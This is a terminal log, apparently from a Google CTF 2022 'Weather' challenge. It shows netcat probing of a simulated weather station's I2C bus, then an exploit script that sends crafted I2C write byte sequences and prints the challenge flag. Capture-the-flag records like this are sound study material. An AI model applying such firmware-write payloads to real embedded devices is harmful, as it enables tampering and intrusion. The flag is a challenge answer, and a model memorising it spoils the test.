```
$ nc weather.2022.ctfcompetition.com 1337
== proof-of-work: disabled ==
Weather Station
? r 101 10
i2c status: transaction completed / ready
22 22 21 35 0 0 0 0 0 0
-end
? r 108 10
i2c status: transaction completed / ready
3 249 0 0 0 0 0 0 0 0
-end
? r 110 10
i2c status: transaction completed / ready
78 0 0 0 0 0 0 0 0 0
-end
? r 111 10
i2c status: transaction completed / ready
81 0 0 0 0 0 0 0 0 0
-end
? r 119 10
i2c status: transaction completed / ready
37 0 0 0 0 0 0 0 0 0
-end
?
$ python3 weather_exploit.py
[+] Opening connection to weather.2022.ctfcompetition.com on port 1337: Done
cmd: w 1010000161 27 40 165 90 165 90 198 255 0 0 134 255 22 10 17 26 16 7 26 12 159 3 23 10 13 246 127 15
i2c status: transaction completed / ready
?
cmd: w 1010000161 9 13 165 90 165 90 255 253 245 251
i2c status: transaction completed / ready
?
CTF{DoesAnyoneEvenReadFlagsAnymore?}
```